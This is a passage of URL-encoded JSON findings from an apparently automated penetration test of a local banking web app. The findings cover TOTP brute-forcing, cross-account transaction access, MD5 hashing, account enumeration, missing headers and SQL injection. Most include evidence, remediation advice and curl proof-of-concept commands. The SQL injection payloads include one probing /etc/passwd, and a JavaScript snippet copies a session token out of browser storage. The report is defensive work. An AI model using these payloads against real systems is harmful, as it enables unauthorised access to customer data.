id%20not%20establish%20how%20the%20endpoint%20behaves%20after%20more%20attempts.%22%2C%22recommendation%22%3A%22Apply%20per-account%20and%20per-source%20attempt%20limits%2C%20progressive%20delays%2C%20and%20temporary%20lockouts%20to%20TOTP%20setup%20verification.%20Bind%20setup%20to%20the%20user's%20session%20and%20clear%20pending%20secrets%20after%20repeated%20failures.%22%2C%22cvss_score%22%3A4.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%2Ftotp%2Fverify%22%2C%22evidence%22%3A%22Six%20consecutive%20POST%20requests%20with%20the%20same%20incorrect%20code%20returned%20HTTP%20403%20%60TOTP_INVALID%60.%20Attempts%201%20and%206%20returned%20the%20same%20error%20body%2C%20and%20observed%20durations%20stayed%20between%2012%20and%2019%20ms.%22%2C%22request_evidence%22%3A%22Six%20consecutive%20requests%20on%20one%20disposable%20account%20used%20the%20same%20incorrect%20six-digit%20code.%22%2C%22response_evidence%22%3A%22Attempt%201%20and%20attempt%206%20both%20returned%20%60%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22TOTP_INVALID%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20TOTP%20code.%20Please%20try%20again.%5C%22%7D%7D%60%3B%20observed%20durations%20stayed%20between%2012%20and%2019%20ms.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Using%20the%20listed%20otp_user%20session%2C%20I%20sent%20three%20bounded%20batches%20of%20six%20correctly%20formed%20invalid%20totp_code%20values%20to%20the%20verification%20endpoint.%20The%20responses%20remained%20HTTP%20403%20TOTP_INVALID%20at%2013-15%20ms%20through%2018%20consecutive%20failures%2C%20with%20no%20429%2Flockout%20response%20or%20increasing%20delay.%20This%20rules%20out%20a%20throttle%20that%20merely%20starts%20after%20the%20scanner's%20six-request%20sample%3B%20the%20endpoint%20allowed%20continued%20rapid%20guessing.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Transaction%20details%20are%20accessible%20across%20accounts%22%2C%22description%22%3A%22An%20authenticated%20user%20can%20request%20a%20transaction%20by%20ID%20without%20an%20ownership%20check.%20The%20endpoint%20returned%20transaction%201%20to%20user%20ID%2023%2C%20whose%20own%20transaction%20list%20showed%20records%20for%20account%20101%2C%20while%20the%20returned%20transaction%20referenced%20account%201.%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20could%20enumerate%20transaction%20IDs%20and%20view%20other%20customers%E2%80%99%20financial%20activity%2C%20including%20transaction%20amounts%2C%20account%20references%2C%20descriptions%2C%20and%20timestamps.%22%2C%22likelihood%22%3A%22The%20endpoint%20accepted%20a%20request%20for%20transaction%20ID%201%20using%20the%20disposable%20authenticated%20session.%20The%20finding%20reports%20that%20transaction%20IDs%20are%20numeric%20and%20sequential%2C%20making%20other%20IDs%20straightforward%20to%20try.%22%2C%22recommendation%22%3A%22Restrict%20transaction%20lookups%20to%20records%20associated%20with%20an%20account%20the%20authenticated%20user%20owns.%20Apply%20the%20ownership%20scope%20in%20the%20database%20query%2C%20and%20return%20an%20authorization%20failure%20when%20the%20transaction%20is%20outside%20that%20scope.%22%2C%22cvss_score%22%3A4.6%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%2F1%22%2C%22evidence%22%3A%22Using%20the%20disposable%20logic_user_fresh%20session%20for%20user%20ID%2023%2C%20GET%20%2Fapi%2Ftransactions%2F1%20returned%20HTTP%20200%20with%20transaction%201%2C%20from_account_id%201%2C%20to_account_id%202%2C%20amount%20500.00%2C%20description%20%E2%80%9CMonthly%20savings%2C%E2%80%9D%20and%20timestamp%202026-01-05%2009%3A12%3A00.%20The%20user%E2%80%99s%20own%20transaction%20list%20showed%20records%20for%20account%20101.%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%2F1%20with%20Bearer%20session%20logic_user_fresh%20(user%20ID%2023).%22%2C%22response_evidence%22%3A%22HTTP%20200%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Monthly%20savings%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22created_at%5C%22%3A%5C%222026-01-05%2009%3A12%3A00%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20anonymous%20request%20was%20rejected%20with%20401%2C%20so%20the%20transaction%20is%20not%20intentionally%20public.%20With%20the%20listed%20logic_user_fresh%20session%2C%20%2Fapi%2Faccounts%20showed%20accounts%20101%2C%20102%2C%20104%2C%20106%2C%20107%2C%20and%20108%2C%20while%20%2Fapi%2Ftransactions%20showed%20only%20that%20user's%20transactions%3B%20neither%20account%201%20nor%202%20was%20among%20the%20user's%20accounts.%20The%20same%20session%20nevertheless%20received%20transaction%201%2C%20including%20its%20amount%20and%20description%2C%20so%20the%20returned%20record%20belongs%20outside%20this%20user's%20account%20scope.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%2F1%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**logic_user_fresh**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20disposable%20logic%20user%20(user%20ID%2023)%2C%20then%20copy%20the%20bearer%20token%20from%20localStorage%2FsessionStorage%20or%20the%20Authorization%20header%20in%20the%20browser's%20Network%20tab.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Registration%20returns%20an%20MD5%20password%20hash%22%2C%22description%22%3A%22The%20registration%20endpoint%20accepted%20the%20one-character%20password%20%60a%60%20and%20returned%20its%20password%20hash%20in%20the%20HTTP%20201%20response.%20The%20returned%20value%2C%20%600cc175b9c0f1b6a831c399e269772661%60%2C%20matches%20the%20unsalted%20MD5%20digest%20of%20%60a%60%2C%20indicating%20use%20of%20a%20fast%20hash%20unsuitable%20for%20password%20storage.%22%2C%22impact%22%3A%22If%20the%20user%20database%20or%20response%20data%20is%20exposed%2C%20an%20attacker%20could%20crack%20MD5%20hashes%20quickly%20and%20try%20recovered%20passwords%20on%20other%20services.%20Returning%20the%20hash%20also%20exposes%20an%20unnecessary%20credential%20verifier.%22%2C%22likelihood%22%3A%22The%20endpoint%20is%20remotely%20accessible%20and%20returned%20the%20hash%20during%20registration.%20Cracking%20or%20password%20reuse%20would%20depend%20on%20an%20attacker%20obtaining%20the%20database%20or%20response%20data.%22%2C%22recommendation%22%3A%22Use%20a%20password%20hashing%20function%20designed%20for%20credentials%2C%20such%20as%20Argon2id%20or%20bcrypt%20with%20appropriate%20work%20factors%20and%20per-password%20salts.%20Do%20not%20include%20password%20hashes%20in%20API%20responses.%22%2C%22cvss_score%22%3A6%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22A%20POST%20to%20%2Fapi%2Fauth%2Fregister%20with%20password%20%60a%60%20returned%20HTTP%20201%20and%20%60password_hash%5C%22%3A%5C%220cc175b9c0f1b6a831c399e269772661%5C%22%60%2C%20matching%20MD5(%60a%60).%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fauth%2Fregister%20body%20included%20%60%5C%22password%5C%22%3A%5C%22a%5C%22%60.%22%2C%22response_evidence%22%3A%22HTTP%20201%20response%20included%20%60%5C%22password_hash%5C%22%3A%5C%220cc175b9c0f1b6a831c399e269772661%5C%22%60.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22unconfirmed%22%2C%22validation_note%22%3A%22I%20sent%20the%20registration%20fields%20with%20an%20existing%20account%20email.%20The%20endpoint%20first%20returned%20422%20for%20missing%20first_name%20and%20last_name%2C%20then%20returned%20409%20DUPLICATE_ENTRY%20once%20those%20fields%20were%20supplied%2C%20so%20no%20account%20was%20created%20and%20no%20password%20hash%20was%20returned.%20The%20scanner's%20reported%20201%20response%20and%20MD5%20value%20could%20not%20be%20independently%20checked%20because%20it%20did%20not%20include%20the%20successful%20request%20body%2C%20and%20safely%20obtaining%20another%20201%20would%20require%20creating%20a%20new%20account%3B%20I%20therefore%20cannot%20confirm%20whether%20that%20response%20was%20live%20or%20whether%20the%20returned%20digest%20was%20the%20stored%20password%20hash.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Login%20errors%20reveal%20whether%20an%20email%20has%20an%20account%22%2C%22description%22%3A%22The%20login%20endpoint%20returns%20different%20error%20codes%20and%20messages%20for%20a%20known%20account%20with%20an%20incorrect%20password%20and%20an%20unregistered%20email%2C%20revealing%20whether%20an%20email%20address%20has%20an%20account.%22%2C%22impact%22%3A%22An%20attacker%20can%20identify%20registered%20email%20addresses%20for%20targeted%20phishing%20or%20credential-stuffing%20attempts.%22%2C%22likelihood%22%3A%22The%20distinction%20was%20observed%20in%20one%20comparison%20using%20a%20disposable%20account%20and%20a%20synthetic%20nonexistent%20address.%20The%20responses%20make%20account%20checks%20practical%2C%20but%20the%20evidence%20does%20not%20establish%20broader%20exposure%20or%20rate-limit%20behaviour.%22%2C%22recommendation%22%3A%22Return%20the%20same%20generic%20authentication%20error%20for%20unknown%20users%20and%20incorrect%20passwords.%20Keep%20response%20timing%20similar%20for%20both%20cases.%22%2C%22cvss_score%22%3A3.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22POST%20requests%20to%20%60%2Fapi%2Fauth%2Flogin%60%20with%20the%20same%20wrong%20password%20returned%20HTTP%20401%20with%20%60WRONG_PASSWORD%60%20and%20%60Incorrect%20password.%60%20for%20%60aespa.weakpass.923%40example.test%60%2C%20and%20%60USER_NOT_FOUND%60%20and%20%60No%20account%20found%20with%20this%20email%20address.%60%20for%20%60no-such-user-923%40example.test%60.%22%2C%22request_evidence%22%3A%22Known%20user%3A%20%60aespa.weakpass.923%40example.test%60%20with%20a%20wrong%20password.%20Unknown%20user%3A%20%60no-such-user-923%40example.test%60%20with%20the%20same%20wrong%20password.%22%2C%22response_evidence%22%3A%22Known%20user%3A%20%60%7B%5C%22code%5C%22%3A%5C%22WRONG_PASSWORD%5C%22%2C%5C%22message%5C%22%3A%5C%22Incorrect%20password.%5C%22%7D%60.%20Unknown%20user%3A%20%60%7B%5C%22code%5C%22%3A%5C%22USER_NOT_FOUND%5C%22%2C%5C%22message%5C%22%3A%5C%22No%20account%20found%20with%20this%20email%20address.%5C%22%7D%60.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20both%20requests%20anonymously%20with%20the%20same%20wrong%20password%20and%20no%20cookies%20or%20authorization%20header.%20The%20registered%20address%20returned%20%60WRONG_PASSWORD%60%20%2F%20%60Incorrect%20password.%60%2C%20while%20the%20unregistered%20address%20returned%20%60USER_NOT_FOUND%60%20%2F%20%60No%20account%20found%20with%20this%20email%20address.%60%3B%20the%20distinct%20response%20directly%20discloses%20account%20existence%2C%20and%20an%20intentionally%20public%20login%20endpoint%20does%20not%20explain%20away%20that%20disclosure.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22email%5C%22%3A%5C%22aespa.weakpass.923%40example.test%5C%22%2C%5C%22password%5C%22%3A%5C%22wrong-password-923%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Missing%20browser%20security%20headers%20on%20the%20admin%20page%22%2C%22description%22%3A%22The%20unauthenticated%20%60%2Fadmin%2F%60%20response%20is%20reported%20to%20omit%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20and%20Referrer-Policy.%20It%20also%20exposes%20the%20Apache%20server%20version.%22%2C%22impact%22%3A%22Without%20these%20headers%2C%20browsers%20lack%20protections%20against%20framing%20and%20MIME%20sniffing%2C%20and%20a%20future%20script-injection%20flaw%20would%20not%20be%20constrained%20by%20a%20CSP.%20The%20disclosed%20server%20version%20may%20help%20an%20attacker%20identify%20the%20server%20software.%22%2C%22likelihood%22%3A%22The%20headers%20were%20absent%20from%20the%20observed%20HTTP%20200%20response.%20The%20evidence%20does%20not%20show%20that%20an%20attacker%20can%20frame%20the%20page%20or%20exploit%20a%20separate%20injection%20flaw.%22%2C%22recommendation%22%3A%22Set%20a%20restrictive%20Content-Security-Policy%2C%20X-Content-Type-Options%3A%20nosniff%2C%20and%20an%20appropriate%20Referrer-Policy.%20Prevent%20framing%20with%20CSP%20frame-ancestors%20or%20X-Frame-Options%2C%20and%20avoid%20exposing%20detailed%20server%20versions.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%22%2C%22evidence%22%3A%22The%20captured%20evidence%20describes%20an%20unauthenticated%20GET%20%2Fadmin%2F%20returning%20HTTP%20200%20text%2Fhtml%20with%20%60Server%3A%20Apache%2F2.4.68%20(Unix)%60%20and%20no%20CSP%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20or%20Referrer-Policy.%22%2C%22request_evidence%22%3A%22Unauthenticated%20GET%20%2Fadmin%2F.%22%2C%22response_evidence%22%3A%22HTTP%20200%20text%2Fhtml%20with%20Apache%20version%20header%20and%20no%20listed%20browser%20security%20headers.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20direct%20unauthenticated%20GET%20to%20the%20reported%20URL%20returned%20HTTP%20200%20from%20Apache%2F2.4.68%20(Unix)%2C%20with%20none%20of%20the%20four%20reported%20security%20response%20headers.%20The%20response%20is%20the%20admin%20HTML%20page%2C%20and%20its%20document%20head%20starts%20with%20only%20charset%20and%20viewport%20metadata%3B%20no%20header-based%20or%20meta-tag%20equivalent%20was%20observed%20to%20cover%20the%20missing%20protections.%20This%20reproduces%20the%20reported%20misconfiguration%20rather%20than%20showing%20proxy%20stripping%20or%20a%20login%20redirect.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Missing%20browser%20security%20headers%20on%20the%20banking%20page%22%2C%22description%22%3A%22The%20unauthenticated%20banking%20page%20at%20%60%2Fbanking%2F%60%20returned%20HTTP%20200%20without%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20or%20Referrer-Policy.%20The%20observation%20also%20reports%20a%20%60Server%3A%20Apache%2F2.4.68%20(Unix)%60%20header.%22%2C%22impact%22%3A%22The%20missing%20headers%20reduce%20browser-side%20protections.%20Framing%20may%20allow%20clickjacking%2C%20and%20without%20a%20Content-Security-Policy%2C%20injected%20scripts%20would%20not%20be%20constrained%20by%20that%20policy.%20Neither%20attack%20was%20demonstrated.%22%2C%22likelihood%22%3A%22The%20headers%20were%20absent%20in%20the%20observed%20unauthenticated%20HTTP%20200%20response.%20Exploitation%20of%20the%20potential%20impacts%20was%20not%20demonstrated.%22%2C%22recommendation%22%3A%22Set%20a%20restrictive%20Content-Security-Policy%20and%20use%20%60frame-ancestors%60%20or%20X-Frame-Options%20to%20control%20framing.%20Set%20%60X-Content-Type-Options%3A%20nosniff%60%20and%20an%20appropriate%20Referrer-Policy.%20Avoid%20exposing%20detailed%20server%20versions.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fbanking%2F%22%2C%22evidence%22%3A%22The%20captured%20observation%20states%20that%20unauthenticated%20%60GET%20%2Fbanking%2F%60%20returned%20HTTP%20200%2C%20exposed%20%60Server%3A%20Apache%2F2.4.68%20(Unix)%60%2C%20and%20lacked%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20and%20Referrer-Policy.%22%2C%22request_evidence%22%3A%22Unauthenticated%20GET%20%2Fbanking%2F.%22%2C%22response_evidence%22%3A%22HTTP%20200%20text%2Fhtml%20with%20Apache%20version%20header%20and%20no%20listed%20browser%20security%20headers.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20an%20unauthenticated%20GET%20directly%20to%20the%20reported%20URL.%20It%20returned%20the%20complete%20response%20header%20set%20with%20no%20CSP%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20or%20Referrer-Policy%3B%20the%20HTML%20head%20also%20has%20no%20meta-based%20CSP%20or%20referrer-policy.%20That%20rules%20out%20proxy%20stripping%20and%20the%20suggested%20meta-policy%20explanation%2C%20and%20the%20page%20serves%20active%20banking%20UI%20content%2C%20so%20there%20is%20no%20concrete%20benign%20explanation%20for%20leaving%20all%20these%20browser%20protections%20unset.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fbanking%2F%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22SQL%20injection%20in%20admin%20customer%20search%22%2C%22description%22%3A%22The%20%60search%60%20parameter%20on%20the%20admin%20customer%20search%20endpoint%20is%20interpreted%20as%20SQL%20syntax.%20A%20boolean%20expression%20bypassed%20the%20requested%20search%20term%20and%20returned%20customer%20records.%22%2C%22impact%22%3A%22An%20attacker%20with%20an%20admin%20account%20can%20make%20the%20search%20return%20customers%20outside%20the%20requested%20term.%20The%20captured%20evidence%20demonstrates%20broader%20search%20results%2C%20but%20not%20database%20access%20beyond%20this%20endpoint%20or%20data%20modification.%22%2C%22likelihood%22%3A%22The%20payload%20was%20accepted%20in%20an%20admin%20session%20and%20changed%20the%20result%20set.%20Exploitation%20therefore%20requires%20access%20to%20an%20admin%20account.%22%2C%22recommendation%22%3A%22Use%20parameterized%20SQL%20or%20ORM%20query%20expressions%20for%20search%20filters.%20Do%20not%20concatenate%20user%20input%20into%20SQL%20text.%22%2C%22cvss_score%22%3A2.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AH%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%26search%3D%2527%2520OR%2520%25271%2527%3D%25271--%2520%22%2C%22evidence%22%3A%22The%20request%20using%20%60search%3D'%20OR%20'1'%3D'1--%60%20returned%20HTTP%20200%20with%2015%20customer%20rows%20and%20a%20pagination%20total%20of%2024.%20The%20response%20included%20customer%20id%2016%20(%60face%40example.com%60%2C%20%60FACE%20Insurance%60).%20The%20baseline%20search%20%60NoSuchTest923%60%20returned%200%20customers.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%26search%3D%2527%2520OR%2520%25271%2527%3D%25271--%2520%20using%20the%20admin_fresh%20session.%22%2C%22response_evidence%22%3A%22HTTP%20200%3B%20response%20JSON%20contained%20%5C%22customers%5C%22%3A%5B...%5D%2C%20%5C%22total%5C%22%3A24%2C%20%5C%22total_pages%5C%22%3A2.%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20clean%20no-match%20search%20returned%20200%20with%20zero%20rows%2C%20while%20the%20reported%20OR%20payload%20returned%2015%20customer%20records.%20A%20separate%20lone-apostrophe%20request%20returned%20a%20MariaDB%20SQLSTATE%201064%20syntax%20error%2C%20with%20the%20database%20trace%20identifying%20PDO-%3Equery()%20in%20AdminUserController.php%3B%20this%20is%20a%20payload-dependent%20database%20error%2C%20not%20a%20hardcoded%20search%20message%20or%20benign%20broad-search%20fallback.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%26search%3D%2527'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%2C%20then%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20DevTools%20Network%20tab%20and%20supply%20it%20when%20replaying%20the%20request.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22SQL%20injection%20in%20admin%20customer%20search%22%2C%22description%22%3A%22The%20%60search%60%20parameter%20on%20%60%2Fapi%2Fadmin%2Fcustomers%60%20accepts%20an%20injected%20SQL%20expression.%20The%20captured%20%60LOAD_FILE('%2Fetc%2Fpasswd')%20IS%20NOT%20NULL%60%20condition%20evaluated%20true%2C%20confirming%20the%20database%20could%20read%20that%20host%20file.%22%2C%22impact%22%3A%22An%20authenticated%20admin%20could%20use%20the%20injection%20to%20change%20the%20customer%20search%20results.%20The%20captured%20request%20returned%20all%2024%20customer%20records%20despite%20%60per_page%3D1%60.%20The%20file-read%20probe%20confirmed%20only%20that%20%60%2Fetc%2Fpasswd%60%20was%20readable%3B%20it%20did%20not%20return%20the%20file%20contents.%22%2C%22likelihood%22%3A%22High%20for%20a%20user%20with%20admin%20access%3A%20the%20injected%20condition%20was%20evaluated%20by%20the%20endpoint%20and%20returned%20customer%20rows.%22%2C%22recommendation%22%3A%22Use%20parameterized%20queries%20for%20all%20search%20values%20and%20restrict%20the%20database%20account's%20%60FILE%60%20privilege%20unless%20it%20is%20required.%20Avoid%20returning%20detailed%20SQL%20errors%20to%20clients.%22%2C%22cvss_score%22%3A2.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AH%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D1%26search%3D%2527%2520OR%2520LOAD_FILE%2528%2527%252Fetc%252Fpasswd%2527%2529%2520IS%2520NOT%2520NULL--%2520%22%2C%22evidence%22%3A%22The%20request%20used%20%60search%3D'%20OR%20LOAD_FILE('%2Fetc%2Fpasswd')%20IS%20NOT%20NULL--%20%60%20with%20%60per_page%3D1%60.%20It%20returned%20HTTP%20200%20and%20all%2024%20customer%20records%2C%20beginning%20with%20%60amelia.chen%40example.com%60.%20The%20injected%20comment%20also%20removed%20the%20pagination%20constraint.%20The%20response%20confirms%20the%20condition%20evaluated%20true%20but%20contains%20no%20%60%2Fetc%2Fpasswd%60%20contents.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D1%26search%3D%2527%2520OR%2520LOAD_FILE%2528%2527%252Fetc%252Fpasswd%2527%2529%2520IS%2520NOT%2520NULL--%2520%20using%20admin_fresh.%22%2C%22response_evidence%22%3A%22HTTP%20200%3B%20response%20JSON%20began%20with%20%5C%22customers%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22email%5C%22%3A%5C%22amelia.chen%40example.com%5C%22...%20and%20continued%20with%20all%2024%20records.%20The%20LOAD_FILE%20non-null%20predicate%20therefore%20evaluated%20true.%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22With%20a%20valid%20admin%20session%2C%20a%20normal%20search%20for%20Amelia%20returned%20one%20row%20at%20per_page%3D1%2C%20while%20the%20reported%20payload%20returned%20additional%20customer%20rows%2C%20including%20Wei%2C%20despite%20the%20same%20pagination%20limit.%20A%20no-match%20search%20returned%20an%20empty%20list%2C%20so%20the%20extra%20rows%20are%20specific%20to%20the%20injected%20input%20and%20not%20the%20endpoint's%20ordinary%20behavior.%20The%20true%20and%20false%20boolean%20controls%20returned%20the%20same%20broad%20result%2C%20so%20they%20do%20not%20prove%20that%20LOAD_FILE('%2Fetc%2Fpasswd')%20itself%20was%20evaluated%20or%20that%20file%20contents%20were%20read%3B%20they%20do%20not%20explain%20away%20the%20payload-driven%20SQL%20filter%20and%20pagination%20bypass.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D1%26search%3D%2527%2520OR%2520LOAD_FILE%2528%2527%252Fetc%252Fpasswd%2527%2529%2520IS%2520NOT%2520NULL--%2520'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin_fresh**%